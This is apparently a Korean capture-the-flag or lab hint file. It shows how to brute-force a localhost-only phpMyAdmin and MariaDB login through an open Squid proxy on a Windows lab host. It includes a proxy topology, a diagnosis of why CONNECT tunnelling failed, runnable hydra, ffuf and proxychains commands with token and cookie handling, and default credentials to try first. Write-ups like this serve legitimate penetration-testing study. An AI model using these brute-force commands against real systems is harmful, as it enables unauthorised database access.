# HINT — Squid 프록시 너머 교차 브루트포스

> 근거: `README.md` 실제 로그 · 규칙: [`docs/WRITEUP_GUIDE.md`](../docs/WRITEUP_GUIDE.md) 3절

## 토폴로지

```text
kali (192.168.45.248)
  │ openvpn
  ▼
192.168.199.189 (Windows)
  ├─ 3128 Squid ──┬─▶ 127.0.0.1:8080  phpMyAdmin
  │  (대신 접속)   └─▶ 127.0.0.1:3307  MariaDB
  └─ 445/135/139  (프록시로 접근 불가)
```

`127.0.0.1`은 나에게도 Squid에게도 자기 자신입니다. 그래서 프록시에 `http://127.0.0.1:8080`을 던져야 닿습니다.

## 실패 지점

| 시도                      | 로그         | 이유                                 |
| ------------------------- | ------------ | ------------------------------------ |
| `HYDRA_PROXY=http://…`    | `:900`       | 형식 무효. `connect/socks4/socks5`만 |
| `HYDRA_PROXY` + `mysql`   | `:885`       | mysql 모듈은 프록시 미지원           |
| proxychains + hydra       | `:939, :993` | `CONNECT` 거부                       |
| `C=/phpmyadmin/index.php` | `:960`       | `C=`는 쿠키 값 자리                  |

**원인은 하나.** 전부 `CONNECT`(터널)로 말했습니다. Squid 기본값이 `acl SSL_ports port 443` + `http_access deny CONNECT !SSL_ports` 라서 CONNECT는 443만 통과합니다. 같은 8080도 `GET`은 되고 `CONNECT`는 안 되는 이유입니다. 유일하게 성공한 `curl -x`(`:395`)만 **포워드(절대 URI)** 방식이었습니다.

## 5분 확인

```bash
curl -s -o /dev/null -w '%{http_code}\n' -x http://192.168.199.189:3128 http://127.0.0.1:8080/phpmyadmin/
curl -sv -p -x http://192.168.199.189:3128 http://127.0.0.1:8080/ 2>&1 | head -5
```

`403` → 경로 B/C · `200 Connection established` → 경로 A

## 경로 A — CONNECT가 열렸을 때

```bash
proxychains4 -q hydra -l root -P <wordlist> -s 3307 127.0.0.1 mysql -t 4 -f
```

## 경로 B — 포워드로 브루트포스 (추천)

토큰과 세션쿠키는 한 세트여야 80만 번을 돌려도 유효합니다.

```bash
J=/tmp/pma.cookie
TOKEN=$(curl -s -c $J -x http://192.168.199.189:3128 \
  http://127.0.0.1:8080/phpmyadmin/index.php | grep -oP 'name="token" value="\K[^"]+')
SID=$(awk '/PHPSESSID/{print $7}' $J)

ffuf -x http://192.168.199.189:3128 \
  -u http://127.0.0.1:8080/phpmyadmin/index.php -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "Cookie: PHPSESSID=$SID; pma_lang=en" \
  -d "pma_username=U&pma_password=P&server=1&target=index.php&token=$TOKEN" \
  -w users.txt:U -w passes.txt:P -mc 302 -t 10 -rate 20
```

성공 302 / 실패 200. `server=1`(3306) · `server=2`(3307).

## 경로 C — Hydra 유지

[`tmp/relay.py`](./tmp/relay.py) 실행 후:

```bash
hydra -L users.txt -P passes.txt -s 18080 127.0.0.1 http-post-form \
"/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&token=$TOKEN:F=Cannot log in:C=PHPSESSID=$SID" \
-t 8 -f
```

## 함정

- 먼저 `root/root`, `root/toor`, `admin/admin`, 빈 비밀번호. WAMP 기본 root는 빈 값이 흔합니다.
- `-t 4` + proxychains → 스레드마다 CONNECT → `all children disabled`.
- `hydra ... mysql`은 `HYDRA_PROXY` 무시. 프록시는 proxychains 담당.
- 17 × 47,603 = 809,251 → 5.6~22시간. 소수정예 먼저.
